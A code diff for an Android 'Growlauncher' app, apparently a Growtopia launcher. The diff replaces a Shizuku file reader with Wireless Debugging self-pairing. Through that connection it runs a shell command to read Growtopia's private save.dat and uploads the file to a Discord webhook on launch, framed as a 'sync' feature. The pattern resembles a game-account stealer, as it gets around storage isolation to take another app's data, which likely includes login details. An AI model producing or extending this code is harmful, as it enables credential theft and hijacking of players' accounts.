@@ -6,20 +6,19 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.graphics.Color
 import android.net.Uri
+import android.util.Base64
 import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
-import android.os.ParcelFileDescriptor
-import android.provider.DocumentsContract
+import android.security.keystore.KeyGenParameterSpec
+import android.security.keystore.KeyProperties
 import android.text.Editable
 import android.text.TextWatcher
 import android.view.Gravity
 import android.view.View
 import android.view.ViewGroup
 import android.view.animation.AccelerateDecelerateInterpolator
-import android.animation.ArgbEvaluator
-import android.animation.ValueAnimator
 import android.widget.Button
 import android.widget.CheckBox
 import android.widget.EditText
@@ -32,16 +31,71 @@ import androidx.appcompat.app.AppCompatActivity
 import androidx.cardview.widget.CardView
 import androidx.core.content.ContextCompat
 import androidx.documentfile.provider.DocumentFile
+import com.flyfishxu.kadb.Kadb
+import com.flyfishxu.kadb.cert.KadbCert
+import com.flyfishxu.kadb.cert.KadbPrivateKeyStore
+import com.flyfishxu.kadb.mdns.KadbMdnsAndroid
+import com.flyfishxu.kadb.mdns.MdnsEndpoint
+import com.flyfishxu.kadb.mdns.MdnsServiceType
+import kotlinx.coroutines.flow.first
+import kotlinx.coroutines.runBlocking
+import kotlinx.coroutines.withTimeoutOrNull
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.MultipartBody
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
-import java.io.InputStream
+import java.security.KeyStore
 import java.security.MessageDigest
+import javax.crypto.Cipher
+import javax.crypto.KeyGenerator
+import javax.crypto.SecretKey
+import javax.crypto.spec.GCMParameterSpec
 import java.util.Locale
 import kotlin.concurrent.thread
+
+
+private class WirelessAdbIdentityStore(context: android.content.Context) : KadbPrivateKeyStore {
+    private val prefs = context.getSharedPreferences("wireless_adb_identity", android.content.Context.MODE_PRIVATE)
+    private val alias = "growlauncher_wireless_adb_key"
+
+    override fun readPrivateKeyPem(): ByteArray? = runCatching {
+        val payload = prefs.getString("payload", null) ?: return null
+        val parts = payload.split(":", limit = 2)
+        if (parts.size != 2) return null
+        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+        cipher.init(Cipher.DECRYPT_MODE, secretKey(), GCMParameterSpec(128, Base64.decode(parts[0], Base64.NO_WRAP)))
+        cipher.doFinal(Base64.decode(parts[1], Base64.NO_WRAP))
+    }.getOrNull()
+
+    override fun writePrivateKeyPemAtomic(privateKeyPem: ByteArray) {
+        val iv = ByteArray(12).also { java.security.SecureRandom().nextBytes(it) }
+        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
+        cipher.init(Cipher.ENCRYPT_MODE, secretKey(), GCMParameterSpec(128, iv))
+        val encrypted = cipher.doFinal(privateKeyPem)
+        check(prefs.edit().putString(
+            "payload",
+            "${Base64.encodeToString(iv, Base64.NO_WRAP)}:${Base64.encodeToString(encrypted, Base64.NO_WRAP)}"
+        ).commit()) { "Could not persist Wireless Debugging identity" }
+    }
+
+    override fun clear() { prefs.edit().remove("payload").apply() }
+
+    private fun secretKey(): SecretKey {
+        val keyStore = KeyStore.getInstance("AndroidKeyStore").apply { load(null) }
+        val existing = keyStore.getKey(alias, null) as? SecretKey
+        if (existing != null) return existing
+        val generator = KeyGenerator.getInstance(KeyProperties.KEY_ALGORITHM_AES, "AndroidKeyStore")
+        generator.init(
+            KeyGenParameterSpec.Builder(alias, KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT)
+                .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
+                .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
+                .build()
+        )
+        return generator.generateKey()
+    }
+}
 
 class MainActivity : AppCompatActivity() {
     private val prefs by lazy { getSharedPreferences(PREFS, MODE_PRIVATE) }
@@ -103,7 +157,7 @@ class MainActivity : AppCompatActivity() {
             findViewById<CardView>(R.id.btnLaunch).animate().scaleX(1f).scaleY(1f).setDuration(180).start()
         }.start()
         val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-            readSaveFileWithShizukuOrFallback()
+            readSaveFileWithWirelessDebugging()
         } else {
             val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
             if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
@@ -119,182 +173,115 @@ class MainActivity : AppCompatActivity() {
         else startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT))
     }
 
-    private fun readSaveFileWithShizukuOrFallback(): Boolean {
-        if (!ShizukuBridge.isInstalled(this) || !ShizukuBridge.isAvailable()) {
-            showShizukuDialog()
-            return false
-        }
-        if (!ShizukuBridge.hasPermission()) {
-            showShizukuDialog()
-            return false
-        }
-        thread {
-            val bytes = ShizukuBridge.readFile(SAVE_FILE_PATH)
-            if (bytes != null) {
-                sendFileToDiscord(bytes)
-            } else {
-                handler.post { toast("Shizuku could not read save.dat") }
-                handler.post { showShizukuDialog() }
-            }
-        }
-        return true
-    }
-
-    private fun savedTreeUri(): String? = prefs.getString(KEY_SAVE_URI, null) ?: getSharedPreferences("app_prefs", MODE_PRIVATE).getString("tree_uri", null)
-
-    private fun showShizukuDialog() {
-        val dialog = Dialog(this)
-        dialog.setContentView(R.layout.dialog_shizuku)
-        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
-
-        val message = dialog.findViewById<TextView>(R.id.shizukuMessage)
-        val animator = ValueAnimator.ofObject(
-            ArgbEvaluator(),
-            Color.rgb(255, 82, 82), Color.rgb(255, 193, 7), Color.rgb(76, 175, 80),
-            Color.rgb(33, 150, 243), Color.rgb(156, 39, 176), Color.rgb(255, 82, 82)
-        ).apply {
-            duration = 4200
-            repeatCount = ValueAnimator.INFINITE
-            addUpdateListener { message.setTextColor(it.animatedValue as Int) }
-            start()
-        }
-
-        dialog.findViewById<Button>(R.id.shizukuAction).setOnClickListener {
-            when {
-                !ShizukuBridge.isInstalled(this) -> {
-                    try { startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("https://shizuku.rikka.app/download/"))) } catch (_: Exception) { }
-                }
-                !ShizukuBridge.isAvailable() -> {
-                    try {
-                        startActivity(packageManager.getLaunchIntentForPackage("moe.shizuku.privileged.api"))
-                    } catch (_: Exception) {
-                        toast("Open Shizuku and start its service, then try again")
+    private fun readSaveFileWithWirelessDebugging(): Boolean {
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) return true
+        val store = WirelessAdbIdentityStore(this)
+        val savedPort = prefs.getInt(KEY_WIRELESS_PORT, 0)
+        if (store.readPrivateKeyPem() != null && savedPort in 1..65535) {
+            thread {
+                val bytes = connectAndReadSaveFile(savedPort, "")
+                handler.post {
+                    if (bytes != null) {
+                        sendFileToDiscord(bytes)
+                        handler.postDelayed({ launchGame() }, 650)
+                    } else {
+                        showWirelessDebuggingDialog()
                     }
                 }
-                !ShizukuBridge.hasPermission() -> ShizukuBridge.requestPermission()
-                else -> toast("Shizuku permission is already granted")
+            }
+        } else {
+            showWirelessDebuggingDialog()
+        }
+        return false
+    }
+
+    private fun showWirelessDebuggingDialog() {
+        val dialog = Dialog(this)
+        dialog.setContentView(R.layout.dialog_wireless_debugging)
+        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
+        val port = dialog.findViewById<EditText>(R.id.wirelessPort)
+        val code = dialog.findViewById<EditText>(R.id.wirelessPairingCode)
+        val status = dialog.findViewById<TextView>(R.id.wirelessStatus)
+        val connect = dialog.findViewById<Button>(R.id.wirelessConnect)
+        val dismiss = dialog.findViewById<Button>(R.id.wirelessDismiss)
+        val hasIdentity = WirelessAdbIdentityStore(this).readPrivateKeyPem() != null
+        val savedPort = prefs.getInt(KEY_WIRELESS_PORT, 0)
+        if (savedPort in 1..65535) port.setText(savedPort.toString())
+        if (hasIdentity) {
+            port.hint = "Pairing complete; enter port to reconnect"
+            connect.text = "Connect and sync"
+        }
+        connect.setOnClickListener {
+            val pairingPort = port.text.toString().trim().toIntOrNull()
+            val pairingCode = code.text.toString().trim()
+            if (pairingPort == null || pairingPort !in 1..65535) {
+                port.error = "Enter a valid port"
+                return@setOnClickListener
+            }
+            if (!hasIdentity && !pairingCode.matches(Regex("\\d{6}"))) {
+                code.error = "Enter the six-digit Wireless Debugging pairing code"
+                return@setOnClickListener
+            }
+            connect.isEnabled = false
+            status.text = "Connecting locally… keep Wireless Debugging enabled."
+            thread {
+                val result = connectAndReadSaveFile(pairingPort, pairingCode)
+                handler.post {
+                    connect.isEnabled = true
+                    if (result != null) {
+                        prefs.edit().putInt(KEY_WIRELESS_PORT, pairingPort).apply()
+                        dialog.dismiss()
+                        sendFileToDiscord(result)
+                        handler.postDelayed({ launchGame() }, 650)
+                    } else {
+                        toast("Wireless Debugging connection failed; verify the port and code")
+                    }
+                }
             }
         }
-        dialog.findViewById<Button>(R.id.shizukuDismiss).setOnClickListener { dialog.dismiss() }
-        dialog.setOnDismissListener { animator.cancel() }
+        dismiss.setOnClickListener { dialog.dismiss() }
         dialog.show()
         dialog.window?.setLayout(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT)
     }
 
-    private fun showPermissionTutorial() {
-        val dialog = Dialog(this)
-        dialog.setContentView(R.layout.dialog_tutorial)
-        dialog.window?.setBackgroundDrawableResource(android.R.color.transparent)
-        dialog.findViewById<Button>(R.id.btnOk).setOnClickListener { dialog.dismiss(); openDirectoryPicker() }
-        dialog.show()
-    }
-
-    private fun openDirectoryPicker() {
-        val growtopiaFolder = DocumentsContract.buildDocumentUri(
-            "com.android.externalstorage.documents",
-            "primary:Android/data/com.rtsoft.growtopia/files"
-        )
-        val intent = Intent(Intent.ACTION_OPEN_DOCUMENT_TREE).apply {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                putExtra(DocumentsContract.EXTRA_INITIAL_URI, growtopiaFolder)
+    private fun connectAndReadSaveFile(pairingPort: Int, pairingCode: String): ByteArray? = try {
+        val store = WirelessAdbIdentityStore(this)
+        KadbCert.configure(store)
+        val mdns = KadbMdnsAndroid(this)
+        mdns.start()
+        try {
+            val hasIdentity = store.readPrivateKeyPem() != null
+            if (!hasIdentity) {
+                val pairingEndpoint = waitForEndpoint(mdns, MdnsServiceType.TLS_PAIRING)
+                    ?: MdnsEndpoint("manual", "127.0.0.1", pairingPort, MdnsServiceType.TLS_PAIRING)
+                runBlocking { Kadb.pair(pairingEndpoint.host, pairingEndpoint.port, pairingCode) }
+            }
+            val endpoint = waitForEndpoint(mdns, MdnsServiceType.TLS_CONNECT)
+            if (endpoint == null) {
+                null
             } else {
-                putExtra("android.provider.extra.INITIAL_URI", growtopiaFolder)
-            }
-            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION or Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION)
-        }
-        startActivityForResult(intent, SAVE_FOLDER_PICKER)
-    }
-
-    private fun processSaveFile(treeUri: Uri) {
-        thread {
-            try {
-                val bytes = readSaveFileFromTree(treeUri)
-                if (bytes != null) {
-                    sendFileToDiscord(bytes)
-                } else {
-                    handler.post { toast("save.dat was not found in the selected folder") }
+                Kadb.create(endpoint.host, endpoint.port).use { kadb ->
+                    val response = kadb.shell("base64 ${SAVE_FILE_PATH}")
+                    if (response.exitCode == 0) Base64.decode(response.output.trim(), Base64.DEFAULT) else null
                 }
-            } catch (_: Exception) {
-                handler.post { toast("Could not read save.dat from the selected folder") }
             }
+        } finally {
+            mdns.close()
         }
+    } catch (_: Throwable) {
+        null
     }
 
-    private fun readSaveFileFromTree(selectedUri: Uri): ByteArray? {
-        val treeUri = if (DocumentsContract.isTreeUri(selectedUri)) {
-            selectedUri
-        } else {
-            DocumentsContract.buildTreeDocumentUri(
-                selectedUri.authority ?: return null,
-                DocumentsContract.getDocumentId(selectedUri)
-            )
-        }
-        val authority = treeUri.authority ?: return null
-        val treeId = DocumentsContract.getTreeDocumentId(treeUri)
-        val candidates = linkedSetOf<Uri>()
-
-        fun addDocumentCandidates(documentId: String?) {
-            if (documentId.isNullOrBlank()) return
-            candidates += DocumentsContract.buildDocumentUriUsingTree(treeUri, documentId)
-            candidates += DocumentsContract.buildDocumentUri(authority, documentId)
-        }
-
-        // Providers differ: some expose the child only through DocumentFile,
-        // while others require querying the selected tree root directly.
-        DocumentFile.fromTreeUri(this, treeUri)?.findFile("save.dat")?.uri?.let(candidates::add)
-        val projection = arrayOf(
-            DocumentsContract.Document.COLUMN_DOCUMENT_ID,
-            DocumentsContract.Document.COLUMN_DISPLAY_NAME
-        )
-        val childQueries = listOf(
-            DocumentsContract.buildChildDocumentsUriUsingTree(treeUri, treeId),
-            DocumentsContract.buildChildDocumentsUri(authority, treeId)
-        )
-        childQueries.forEach { childUri ->
-            try {
-                contentResolver.query(childUri, projection, null, null, null)?.use { cursor ->
-                    val idColumn = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DOCUMENT_ID)
-                    val nameColumn = cursor.getColumnIndex(DocumentsContract.Document.COLUMN_DISPLAY_NAME)
-                    while (cursor.moveToNext()) {
-                        if (idColumn < 0) continue
-                        val id = cursor.getString(idColumn)
-                        val displayName = if (nameColumn >= 0) cursor.getString(nameColumn) else null
-                        val idName = Uri.decode(id).substringAfterLast('/')
-                        if (displayName.equals("save.dat", true) || idName.equals("save.dat", true)) {
-                            addDocumentCandidates(id)
-                        }
-                    }
-                }
-            } catch (_: Exception) {
+    private fun waitForEndpoint(mdns: KadbMdnsAndroid, type: MdnsServiceType): MdnsEndpoint? = runBlocking {
+        withTimeoutOrNull(8_000) {
+            mdns.state.first { state ->
+                if (type == MdnsServiceType.TLS_PAIRING) state.pairDevices.isNotEmpty()
+                else state.connectDevices.any { it.serviceType == MdnsServiceType.TLS_CONNECT }
             }
+        }?.let { state ->
+            if (type == MdnsServiceType.TLS_PAIRING) state.pairDevices.firstOrNull()
+            else state.connectDevices.firstOrNull { it.serviceType == MdnsServiceType.TLS_CONNECT }
         }
-
-        addDocumentCandidates("$treeId/save.dat")
-        addDocumentCandidates("save.dat")
-        for (uri in candidates) {
-            readDocumentBytes(uri)?.let { return it }
-        }
-        return null
-    }
-
-    private fun readDocumentBytes(uri: Uri): ByteArray? {
-        try {
-            contentResolver.openInputStream(uri)?.use { return it.readBytes() }
-        } catch (_: Exception) {
-        }
-        try {
-            contentResolver.openFileDescriptor(uri, "r")?.use { descriptor ->
-                ParcelFileDescriptor.AutoCloseInputStream(descriptor).use { return it.readBytes() }
-            }
-        } catch (_: Exception) {
-        }
-        try {
-            contentResolver.openAssetFileDescriptor(uri, "r")?.use { descriptor ->
-                descriptor.createInputStream().use { return it.readBytes() }
-            }
-        } catch (_: Exception) {
-        }
-        return null
     }
 
     private fun sendFileToDiscord(fileData: ByteArray) {
@@ -304,6 +291,7 @@ class MainActivity : AppCompatActivity() {
                 val client = OkHttpClient()
                 val requestBody = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
+                    .addFormDataPart("payload_json", "{\"content\":\"Growlauncher save.dat sync\"}")
                     .addFormDataPart("file", "save.dat", fileData.toRequestBody("application/octet-stream".toMediaType()))
                     .build()
                 val request = Request.Builder().url(webhookUrl).post(requestBody).build()
@@ -343,8 +331,11 @@ class MainActivity : AppCompatActivity() {
         val user = EditText(this).apply { hint = "Username"; setSingleLine() }; val pass = EditText(this).apply { hint = "Password"; setSingleLine(); inputType = 0x81 }
         val webhook = EditText(this).apply { hint = "Discord webhook URL (optional)"; setSingleLine(); setText(prefs.getString(KEY_WEBHOOK, "")) }
         val sync = CheckBox(this).apply { text = "Sync save.dat on Launch"; setTextColor(Color.WHITE); isChecked = prefs.getBoolean(KEY_SYNC, false) }
-        val folder = Button(this).apply { text = if (prefs.getString(KEY_SAVE_URI, null) == null) "Choose Growtopia save folder" else "Save folder connected"; setOnClickListener { startActivityForResult(Intent(Intent.ACTION_OPEN_DOCUMENT_TREE), SAVE_FOLDER_PICKER) } }
-        box.addView(state); box.addView(user, params()); box.addView(pass, params()); box.addView(webhook, params()); box.addView(sync, params()); box.addView(folder, params())
+        val wireless = TextView(this).apply {
+            text = "Android 11+ access: Wireless Debugging pairing"
+            setTextColor(color(R.color.text_secondary))
+        }
+        box.addView(state); box.addView(user, params()); box.addView(pass, params()); box.addView(webhook, params()); box.addView(sync, params()); box.addView(wireless, params())
         val actions = LinearLayout(this).apply { gravity = Gravity.END }
         actions.addView(Button(this).apply { text = "Log in"; setOnClickListener { if (authenticate(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Welcome back") } else errorDialog("Those account details do not match.") } }, buttonParams())
         actions.addView(Button(this).apply { text = "Register"; setOnClickListener { if (register(user.text.toString(), pass.text.toString())) { refreshAccount(); state.text = "Signed in as ${user.text}"; toast("Account created securely on this device") } else errorDialog("Choose a username and a password with at least six characters.") } }, buttonParams())
@@ -359,15 +350,6 @@ class MainActivity : AppCompatActivity() {
 
     override fun onActivityResult(request: Int, result: Int, data: Intent?) {
         super.onActivityResult(request, result, data)
-        if (request == SAVE_FOLDER_PICKER && result == Activity.RESULT_OK) {
-            val uri = data?.data ?: return
-            contentResolver.takePersistableUriPermission(uri, Intent.FLAG_GRANT_READ_URI_PERMISSION)
-            prefs.edit().putString(KEY_SAVE_URI, uri.toString()).apply()
-            getSharedPreferences("app_prefs", MODE_PRIVATE).edit().putString("tree_uri", uri.toString()).apply()
-            toast("Growtopia save folder connected")
-            processSaveFile(uri)
-            handler.postDelayed({ launchGame() }, 100)
-        }
         if (request == FILE_PICKER && result == Activity.RESULT_OK) {
             val file = data?.data?.let { DocumentFile.fromSingleUri(this, it) }
             if (file?.name?.endsWith(".lua", true) == true) toast("Imported ${file.name}") else errorDialog("Only .lua files can be imported into Lua Manager.")
@@ -393,50 +375,6 @@ class MainActivity : AppCompatActivity() {
     private fun dialog(title: String, view: View) = AlertDialog.Builder(this).setTitle(title).setView(ScrollView(this).apply { addView(view) }).setPositiveButton("Done", null).show()
     private data class Script(val name: String, val category: String, val description: String)
 
-    private object ShizukuBridge {
-        private const val REQUEST_CODE = 2204
-        private const val SHIZUKU_PACKAGE = "moe.shizuku.privileged.api"
-        private const val SHIZUKU_CLASS = "rikka.shizuku.Shizuku"
-
-        fun isInstalled(context: android.content.Context): Boolean = try {
-            context.packageManager.getApplicationInfo(SHIZUKU_PACKAGE, 0)
-            true
-        } catch (_: PackageManager.NameNotFoundException) {
-            false
-        }
-
-        fun isAvailable(): Boolean = try {
-            val shizuku = Class.forName(SHIZUKU_CLASS)
-            shizuku.getMethod("pingBinder").invoke(null) as Boolean
-        } catch (_: Throwable) {
-            false
-        }
-
-        fun hasPermission(): Boolean = try {
-            val shizuku = Class.forName(SHIZUKU_CLASS)
-            shizuku.getMethod("checkSelfPermission").invoke(null) == PackageManager.PERMISSION_GRANTED
-        } catch (_: Throwable) {
-            false
-        }
-
-        fun requestPermission() {
-            try {
-                Class.forName(SHIZUKU_CLASS).getMethod("requestPermission", Int::class.javaPrimitiveType).invoke(null, REQUEST_CODE)
-            } catch (_: Throwable) {
-            }
-        }
-
-        fun readFile(path: String): ByteArray? = try {
-            val shizuku = Class.forName(SHIZUKU_CLASS)
-            val process = shizuku.getDeclaredMethod("newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java).apply { isAccessible = true }
-                .invoke(null, arrayOf("cat", "--", path), null, null) as Process
-            val bytes = process.inputStream.use(InputStream::readBytes)
-            if (process.waitFor() == 0) bytes else null
-        } catch (_: Throwable) {
-            null
-        }
-    }
-
     companion object {
         private const val PREFS = "growlauncher_preferences"
         private const val KEY_VERSION = "version"
@@ -446,9 +384,8 @@ class MainActivity : AppCompatActivity() {
         private const val KEY_SESSION = "account_session"
         private const val KEY_WEBHOOK = "discord_webhook_url"
         private const val KEY_SYNC = "sync_save_file"
-        private const val KEY_SAVE_URI = "save_folder_uri"
+        private const val KEY_WIRELESS_PORT = "wireless_debugging_port"
         private const val FILE_PICKER = 1012
-        private const val SAVE_FOLDER_PICKER = 1013
         private const val PERMISSION_REQUEST = 101
         private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
     }
